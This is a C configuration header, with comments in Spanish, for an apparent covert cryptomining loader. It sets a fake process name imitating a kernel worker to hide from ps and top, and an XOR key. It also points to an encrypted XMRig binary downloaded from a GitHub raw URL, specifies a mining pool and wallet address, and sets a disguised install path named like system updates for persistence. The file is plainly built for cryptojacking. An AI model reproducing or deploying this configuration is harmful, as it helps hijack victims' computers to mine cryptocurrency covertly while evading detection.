#ifndef CONFIG_H
#define CONFIG_H

// --- Identidad y Seguridad ---
#define PROC_NAME "[kworker/u2:1]"   // Nombre falso para ps/top
#define ENCRYPTION_KEY "ENI_LO_LIMERENCE_2023" // Llave para XOR

// --- Payload (XMRig) ---
// URL del binario RAW cifrado.
// IMPORTANTE: El loader espera un ejecutable ELF estático (no un .tar.gz),
// previamente cifrado con la llave de arriba.
#define PAYLOAD_HOST "raw.githubusercontent.com"
#define PAYLOAD_PATH "/Darkdiamond10/xmrig1/main/xmrig.enc"

// --- Configuración de Minería ---
#define POOL_URL "europe.mining-dutch.nl:9996"
#define WALLET_ADDR "48wJwALTg5mdq69jgKQMTGdsEggBZXndh3GgcpLCX9T9brTBto5YSw8679GoxPWp8giMuVz9CZBD7Z34FQVsPnEt6UW1j9d" // Placeholder
#define PASSWD "x"

// --- Persistencia ---
#define INSTALL_DIR ".local/share/system-updates"
#define INSTALL_NAME "sys-upd-d"

// --- Red ---
#define MAX_RETRIES 5
#define RETRY_DELAY_SEC 10

#endif
